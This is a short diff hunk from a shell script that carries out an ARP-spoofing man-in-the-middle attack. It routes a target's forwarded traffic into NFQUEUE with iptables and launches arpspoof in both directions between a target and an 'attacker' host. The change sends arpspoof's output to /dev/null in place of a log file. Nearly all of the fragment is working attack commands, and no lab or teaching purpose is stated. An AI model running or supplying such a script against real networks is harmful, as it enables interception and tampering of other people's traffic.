@@ -27,9 +27,9 @@ sudo iptables -A FORWARD -d $target -j NFQUEUE --queue-num 0
 sudo iptables -A FORWARD -s $target -j NFQUEUE --queue-num 0
 
 # Start arpspoof commands in the background
-arpspoof -i $interface -t $target $attacker > arpspoof.log 2>&1 &
+arpspoof -i $interface -t $target $attacker > /dev/null 2>&1 &
 PID1=$!
-arpspoof -i $interface -t $attacker $target > arpspoof.log 2>&1 &
+arpspoof -i $interface -t $attacker $target > /dev/null 2>&1 &
 PID2=$!
 
 cat
